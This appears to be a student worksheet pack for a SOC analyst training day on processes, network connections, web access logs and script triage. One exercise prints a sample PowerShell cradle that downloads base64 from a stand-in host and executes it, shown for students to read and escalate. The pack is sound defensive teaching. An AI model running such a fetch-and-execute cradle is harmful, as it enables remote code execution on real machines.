# DAY 5 — STUDENT ACTIVITY PACK
## Underneath the Alert — the Machine, the Wire, the Web and the Script
### Everything you do today

---

## TODAY'S FIVE TOPICS

| # | Topic |
|---|-------|
| **5.1** | The Machine Underneath |
| **5.2** | Preparing and Maintaining the Analyst Workstation |
| **5.3** | The Wire |
| **5.4** | The Web Request |
| **5.5** | Reading Scripts for Triage |

## WHAT IS IN THIS PACK

| Part | What | When |
|------|------|------|
| 1 | Activity 1 — "Where Does It Live?" | 8:35 AM, live |
| 2 | Activity 2 — "Follow the Connection" | 9:40 AM, breakout pairs |
| 3 | Activity 3 — "Access-Log Detective" | 10:40 AM, breakout teams |
| 4 | Activity 4 — "Explain This Script, Don't Run It" | 11:15 AM, breakout pairs |
| 5 | Your afternoon — Tasks 1–9 | 1:00–4:00 PM, on your own |

## THE TWO RULES THAT COVER THE WHOLE DAY

> - **Read a suspicious script. Never run it.**
> - **Scan only a machine you are authorised to scan** — today, only your own (`127.0.0.1`).

You also need two files sent with your joining note: **`Day_5_access_log.txt`** and **`Day_5_log_parser.py`**. Put both in a folder you can find.

---
---

# PART 1 — ACTIVITY 1: WHERE DOES IT LIVE?
### 8:35 AM · 12 minutes · Topic 5.1 · answers in the chat

For each item, decide **NORMAL** or **SUSPICIOUS**, and be ready to say why in one line. Speed matters — a few seconds each. **The reason is what is marked, not the word.**

| # | What you see | Your answer | Your one-line reason |
|---|-------------|-------------|----------------------|
| 1 | `svchost.exe` running from `C:\Windows\System32` | | |
| 2 | `svchost.exe` running from `C:\Users\Public` | | |
| 3 | `chrome.exe` running from `C:\Program Files\Google\Chrome\...` | | |
| 4 | `explorer.exe` running from your `Downloads` folder | | |
| 5 | A scheduled task `Adobe Update Checker` running an encoded PowerShell command | | |
| 6 | A service `Windows Update` (`wuauserv`) set to start automatically | | |
| 7 | `lsass.exe` in `C:\Windows\System32`, signed by Microsoft | | |
| 8 | A process named `1sass.exe` (with a digit one) in `C:\Temp` | | |
| 9 | A startup entry pointing at a `.vbs` file in a temp folder | | |
| 10 | `python.exe` in `C:\Python314`, because you installed Python this morning | | |

---
---

# PART 2 — ACTIVITY 2: FOLLOW THE CONNECTION
### 9:40 AM · 25 minutes · Topic 5.3 · breakout pairs · **THIS IS OBSERVED**

You will trace one of **your own** live network connections to the program that owns it, then report it to your partner **using only clues** — never your own IP address. This is the Day 3 never-paste rule, on your own machine.

## Step 1 — make a connection to trace
Open a normal website in your browser (or the `http.server` from the demo). This creates live connections.

## Step 2 — list your connections with their owning process

```powershell
Get-NetTCPConnection -State Established |
  Select-Object LocalPort, RemoteAddress, RemotePort,
    @{Name='Process'; Expression={ (Get-Process -Id $_.OwningProcess).ProcessName }} |
  Format-Table -AutoSize
```

*(Or `netstat -ano | findstr ESTABLISHED` then `tasklist /fi "pid eq <number>"`.)*

## Step 3 — pick ONE connection and fill this in

| Question | Your answer |
|----------|-------------|
| What **process** owns it? | |
| What **remote port** is it on, and what service is that? | |
| Is the remote address **public or private**? | |
| Does this connection make sense for that process? | |

## Step 4 — report it to your partner, using clues only

> **Say it like this, out loud:** *"I have a connection owned by [process], on port [number] which is [service], to a [public/private] address. It makes sense because [reason]."*
> **Do NOT say your own IP address.** It identifies your machine. Describe the connection in clues — process, port, public/private — exactly as you would look up a clue and never send content.

**What is observed:** (1) did you join the connection to its process without being told the exact command, and (2) did you report it in clues rather than reading out your own address?

---
---

# PART 3 — ACTIVITY 3: ACCESS-LOG DETECTIVE
### 10:40 AM · 25 minutes · Topic 5.4 · breakout teams

Your team gets forty lines of a web access log from a small website, `www.example-client.ph` (it is `Day_5_access_log.txt`, and the trainer will paste it into your room). **Six addresses appear.** Tell the story of what happened, then decide.

## Step 1 — sort the addresses
For each address, say whether it is a **normal visitor**, a **scanner**, or the **attacker**, and give the one line of evidence that tells you.

| Address | Visitor / Scanner / Attacker | The line that proves it |
|---------|------------------------------|-------------------------|
| `203.0.113.10` | | |
| `203.0.113.11` | | |
| `203.0.113.12` | | |
| `198.51.100.23` | | |
| `203.0.113.45` | | |
| `192.0.2.77` | | |

## Step 2 — tell the attack story in order
Put these five things in the order they happened, using the timestamps:

- [ ] A scanner throws 404s hunting for admin and backup paths
- [ ] The attacker brute-forces the WordPress login and gets in
- [ ] The attacker uploads a plugin
- [ ] The attacker runs commands through an uploaded file
- [ ] Path-traversal attempts are blocked with 403s

## Step 3 — the two questions that decide it

1. **Which single line is the worst thing in the log, and why?**
2. **Threat, detection, or routine?** Give the reason. *(Remember: the difference between threat and detection is containment, not severity.)*

---
---

# PART 4 — ACTIVITY 4: EXPLAIN THIS SCRIPT, DON'T RUN IT
### 11:15 AM · 18 minutes · Topic 5.5 · breakout pairs · **DO NOT RUN ANY OF THESE**

Three scripts. For each, read it and answer: **what does it do, does it contact the internet, and would you run it or escalate it?** You will not run any of them. Reading is the job.

## Script A
```powershell
# collect-baseline.ps1
$out = "C:\Evidence\Day_05\baseline_processes.csv"
Get-Process | Select-Object Name, Id, Path, Company | Sort-Object Name | Export-Csv -Path $out -NoTypeInformation
Write-Host "Wrote process list to $out"
```
| Question | Your answer |
|----------|-------------|
| What does it do? | |
| Does it contact the internet? | |
| Run it, or escalate? | |

## Script B *(found in a scheduled task named "Adobe Update Checker")*
```powershell
$u = "hxxp://203.0.113.45/p.txt"
$c = (New-Object Net.WebClient).DownloadString($u)
$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c))
Invoke-Expression $b
```
| Question | Your answer |
|----------|-------------|
| What does it do? | |
| Does it contact the internet? | |
| Run it, or escalate? | |

## Script C
```python
import re, sys
from collections import Counter
LINE = re.compile(r'^(\S+) \S+ \S+ \[([^\]]+)\] "(\S+) (\S+) [^"]*" (\d{3}) ')
not_found = Counter()
with open(sys.argv[1], encoding="utf-8") as log:
    for line in log:
        m = LINE.match(line)
        if not m: continue
        ip, when, method, path, status = m.groups()
        if status == 404:
            not_found[ip] += 1
print("Total 404s:", sum(not_found.values()))
```
| Question | Your answer |
|----------|-------------|
| The log has seven 404s. This script reports zero. Why? | |
| What is the lesson for trusting a script's silence? | |

---
---

# PART 5 — YOUR AFTERNOON
### 1:00 to 4:00 PM · on your own · about 2 hours 50 minutes

Nine tasks. Everything you produce goes in a folder called `Evidence/Day_05/`. Submit by 4:00 PM.

| # | Task | Min | You hand in |
|---|------|-----|-------------|
| 1 | Workstation build checklist | 25 | Signed checklist |
| 2 | Capture and register your baseline | 25 | 4 CSVs, hashed and named + register row |
| 3 | Maintain and back up | 15 | Maintenance note + two matching hashes |
| 4 | Annotate five of your own connections | 25 | Annotated capture |
| 5 | Draw your network's port map | 20 | Diagram |
| 6 | Read the web log | 25 | Six answers |
| 7 | Extend the parser | 25 | Script + its output |
| 8 | Re-ticket WKS-311 | 5 | Ticket + self-check |
| 9 | Reflection | 5 | Three answers |

## How the afternoon is marked

**The reason matters more than the answer.** A correct action with no reason is not competent; a well-reasoned answer that reaches a defensible conclusion is.

---
---

# PART 6 — AFTERNOON WORKSHEETS

## TASK 1 — WORKSTATION BUILD CHECKLIST
### 25 minutes · Topic 5.2 · `ICT311203` E1, E2

Tick each item once done on your machine, and record the detail. This is you preparing your analyst workstation and recording it accurately.

| Item | Done | Detail to record |
|------|------|------------------|
| PowerShell available | ☐ | Version (`$PSVersionTable.PSVersion`): |
| Browser with developer tools | ☐ | Name and version: |
| Python 3 installed (or noted as unavailable) | ☐ | Version (`python --version`): |
| Portable tools present (TCPView, Autoruns) or noted | ☐ | Which ones: |
| Evidence folder created | ☐ | Path: |
| OH&S: screen, chair, lighting checked (Day 3 audit) | ☐ | One thing you adjusted: |

**Sign:** _________________  **Date:** __________

## TASK 2 — CAPTURE AND REGISTER YOUR BASELINE
### 25 minutes · Topic 5.2 · `ICT311203` E3, E4 · `400311106` LO5

**Step 1 — export the four lists** (run each; they write into your evidence folder):
```powershell
Get-Process       | Select-Object Name, Id, Path, Company | Sort-Object Name | Export-Csv .\baseline_processes.csv -NoTypeInformation
Get-Service       | Select-Object Name, Status, StartType | Export-Csv .\baseline_services.csv  -NoTypeInformation
Get-ScheduledTask | Select-Object TaskName, TaskPath, State | Export-Csv .\baseline_tasks.csv    -NoTypeInformation
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Export-Csv .\baseline_autoruns.csv -NoTypeInformation
```
**Step 2 — hash each file:** `Get-FileHash .\baseline_processes.csv -Algorithm SHA256`
**Step 3 — name each to the Day 3 convention:** `YYYY-MM-DD_TICKET_HOST_DESCRIPTION.csv` (use `BASELINE` as the ticket).
**Step 4 — register:**

| File name (renamed) | SHA-256 (first 12 chars) | What it is |
|---------------------|--------------------------|------------|
| | | processes |
| | | services |
| | | scheduled tasks |
| | | autoruns |

**One line:** why is a baseline worth capturing when nothing is wrong? __________

## TASK 3 — MAINTAIN AND BACK UP
### 15 minutes · Topic 5.2 · `ICT311203` E4, E5

| Check | Command | Your result |
|-------|---------|-------------|
| Antivirus on and up to date | `Get-MpComputerStatus \| Select AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated` | |
| Free disk space | `Get-PSDrive C` | |
| Backup a baseline file, then verify the copy | `Copy-Item .\baseline_processes.csv .\backup_processes.csv`; hash both | Original hash: ___ / Copy hash: ___ / Match? ___ |

**One line:** why is an unverified copy not a real backup? __________

## TASK 4 — ANNOTATE FIVE OF YOUR OWN CONNECTIONS
### 25 minutes · Topic 5.3 · Knowledge 1.4

Run the connection command from Activity 2. Pick **five** connections and fill in the table. **Do not include screenshots that show anything but this table** — no personal browsing.

| # | Owning process | Remote port | Service (443=HTTPS, etc.) | Public or private? | Normal for this process? |
|---|----------------|-------------|---------------------------|--------------------|--------------------------|
| 1 | | | | | |
| 2 | | | | | |
| 3 | | | | | |
| 4 | | | | | |
| 5 | | | | | |

**One line:** which connection would you look at first if this were an alert machine, and why? __________

## TASK 5 — DRAW YOUR NETWORK'S PORT MAP
### 20 minutes · Topic 5.3 · Knowledge 1.4

Draw (on paper, or in any tool) a simple diagram of your own home or lab network:
- Your machine with its **private** address (from `ipconfig`)
- The **router / gateway**
- The **public** address the network shares (search "what is my IP", or write "public IP" as a box — do not publish the actual number)
- Mark where **NAT** happens
- If you know of any **port forwarding** on your router, show it as an arrow inward; if none, write "no forwarded ports found"

**Two lines:** what would an attacker on the internet be able to reach directly, and what is hidden behind NAT? __________

## TASK 6 — READ THE WEB LOG
### 25 minutes · Topic 5.4 · Knowledge 1.2

**First, make your own log:** start `python -m http.server 8000`, visit `http://localhost:8000` (a 200) and `http://localhost:8000/nope.html` (a 404), and copy the two lines from the server window.

**Then answer these six questions about `Day_5_access_log.txt`:**

1. Which address made the most requests, and how many? __________
2. Which address is a **scanner**, and what in its lines tells you? __________
3. How many `wp-login.php` POSTs came from `203.0.113.45`, and what does the `302` after them mean? __________
4. What do the two `403` responses to `192.0.2.77` tell you the server did? __________
5. Find the line `thumb.php?c=whoami` with status `200`. Why is this the worst line in the log? __________
6. In one sentence: what happened to this website? __________

## TASK 7 — EXTEND THE PARSER
### 25 minutes · Topic 5.5 · Knowledge 1.3

Open `Day_5_log_parser.py`. Add a third count: **404s per IP address**, and **flag any address with more than 5**. A hint — you already have the pieces:
- add a third `Counter()` near the top, e.g. `not_found = Counter()`
- inside the loop, after you have `status`, add: `if status == "404": not_found[ip] += 1`
- after the existing prints, print `not_found.most_common()` and mark any count over 5

Run it: `python Day_5_log_parser.py Day_5_access_log.txt`

**Hand in:** your edited script, and its output. Your output should flag **one** address.

> **No Python?** Do it by hand: count, from `Day_5_access_log.txt`, how many 404s each address caused, and write the tally. The skill being marked is reading the log.

## TASK 8 — RE-TICKET WKS-311
### 5 minutes · Topic 5.5 / quality · `ICT315202` LO2 · `CS-ICT251101` E1 PC 1.5

On Day 3 your ticket for WKS-311 was missing the process and the port detail, because nobody could get them. Now you can. Using the connection snapshot in `Day_5_Sample_Data.md` §1, **re-write the WKS-311 ticket** with:
- the private address of WKS-311
- the **process** that owns the bad connection, and where it lives
- the remote address and **port**, and what the port means
- your decision (threat / detection / routine) and the reason
- what you need next

**Then self-check it** against your class QA checklist from Day 3. Which field does the new ticket have that the Day 3 one lacked? __________

## TASK 9 — REFLECTION
### 10 minutes

1. What is one thing an alert points at that you could not read this morning but can read now?
2. You are handed a script found in a scheduled task. What do you do, and what do you **not** do?
3. Which was harder — reading the network, the web log, or the script — and why?

---
---

# PART 7 — HANDING IN

Put everything in `Evidence/Day_05/` and submit by 4:00 PM:

- [ ] Task 1 signed build checklist
- [ ] Task 2 four baseline CSVs (named), hashes, register table
- [ ] Task 3 maintenance note with two matching hashes
- [ ] Task 4 five annotated connections
- [ ] Task 5 port-map diagram
- [ ] Task 6 six web-log answers plus your own two log lines
- [ ] Task 7 edited parser and its output (or the hand tally)
- [ ] Task 8 re-written WKS-311 ticket + self-check
- [ ] Task 9 three reflection answers

> **Tomorrow: Day 6, the SIEM.** You will enrol a Wazuh agent, so bring a machine you can install software on.
